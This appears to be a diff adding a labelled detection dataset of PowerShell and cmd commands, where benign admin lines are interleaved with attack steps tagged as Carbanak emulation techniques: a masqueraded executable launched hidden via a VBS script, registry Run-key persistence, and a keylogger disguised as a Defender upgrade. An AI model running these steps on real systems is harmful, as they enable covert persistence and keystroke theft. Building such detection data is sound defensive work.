@@ -1,0 +1,17 @@
+Move-Item Java-Update.exe C:\Users\Public\Java-Updater.exe;
+echo Set oShell = CreateObject ("Wscript.Shell") > C:\Users\Public\Java-Update.vbs;
+echo Dim strArgs >> C:\Users\Public\Java-Update.vbs;
+echo strArgs = "C:\Users\Public\Java-Updater.exe" >> C:\Users\Public\Java-Update.vbs;
+echo oShell.Run strArgs, 0, false >> C:\Users\Public\Java-Update.vbs     // GROUND-TRUTH : T1105: Ingress Tool Transfer (command-and-control) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
+Test-Path C:\Logs\ -PathType Container     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-Service | Where-Object {$_.Status -eq 'Stopped'} | ForEach-Object {$_.Start-Service}     // LABEL: BENIGN-POWERSHELL-COMMAND
+Test-Path -Path 'C:\Windows\System32\System32\WindowsPowerShell\v1.0\Modules\' -PathType Container     // LABEL: BENIGN-POWERSHELL-COMMAND
+cmd.exe /c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /f /v Java-Update /t REG_SZ /d C:\Users\Public\Java-Update.vbs     // GROUND-TRUTH : T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (persistence) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
+Get-Service | Where-Object {$_.Status -eq 'Running'} | Set-Service -StartupType Disabled     // LABEL: BENIGN-POWERSHELL-COMMAND
+$password = ConvertTo-SecureString 'Password123' -AsPlainText -Force     // LABEL: BENIGN-POWERSHELL-COMMAND
+Get-ADComputer -Filter {Name -like 'Server*'} -Properties OperatingSystem -ExpandProperty OperatingSystem | Out-File 'C:\ComputerDetails.txt'     // LABEL: BENIGN-POWERSHELL-COMMAND
+Move-Item keylogger.exe C:\Users\#{cfo.user.username}\AppData\Local\Temp\DefenderUpgradeExec.exe;
+C:\Users\#{cfo.user.username}\AppData\Local\Temp\DefenderUpgradeExec.exe     // GROUND-TRUTH : T1056.001: Input Capture: Keylogging (collection) -- INJECTED APT-TECHNIQUE-COMMAND from - Carbanak Emulation-Plan
+Get-WmiObject Win32_OperatingSystem | Select-Object -Property Caption, CSName, InstallDate | Out-File C:\Win32OS.csv     // LABEL: BENIGN-POWERSHELL-COMMAND
+Copy-Item -Path 'C:\Source\*' -Destination 'C:\Destination\' -Recurse -ErrorAction SilentlyContinue     // LABEL: BENIGN-POWERSHELL-COMMAND
+$env:TEMP=\C:\Temp\Workspace\""     // LABEL: BENIGN-POWERSHELL-COMMAND
